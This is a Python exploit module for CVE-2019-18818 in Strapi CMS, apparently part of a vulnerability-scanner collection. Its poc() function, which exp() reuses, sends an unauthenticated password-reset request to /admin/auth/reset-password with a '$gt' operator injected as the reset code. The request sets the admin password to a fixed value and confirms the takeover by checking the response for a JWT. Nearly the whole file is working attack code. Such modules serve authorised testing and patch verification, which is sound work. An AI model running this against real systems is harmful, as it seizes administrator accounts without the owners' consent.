import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Strapi CMS - Admin password reset (Unauthenticated)''',
        "description": '''strapi before 3.0.0-beta.17.5 mishandles password resets within packages/strapi-admin/controllers/Auth.js and packages/strapi-plugin-users-permissions/controllers/Auth.js.''',
        "severity": "critical",
        "references": [
            "https://github.com/advisories/GHSA-6xc2-mj39-q599", 
            "https://www.exploit-db.com/exploits/50239", 
            "https://nvd.nist.gov/vuln/detail/CVE-2019-18818"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2019-18818",
            "cwe-id": "CWE-640"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2019", "strapi", "auth-bypass", "intrusive"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/admin/auth/reset-password"""
        method = "POST"
        data = {"code": {"$gt": 0}, "password": "SuperStrongPassword1", "passwordConfirmation": "SuperStrongPassword1"}
        headers = {'Content-Type': 'application/json'}
        resp0 = requests.request(method=method,url=url+path,json=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp0.status_code == 200) and ("""application/json""" in str(resp0.headers)) and ("""username":""" in resp0.text and """email":""" in resp0.text and """jwt":""" in resp0.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url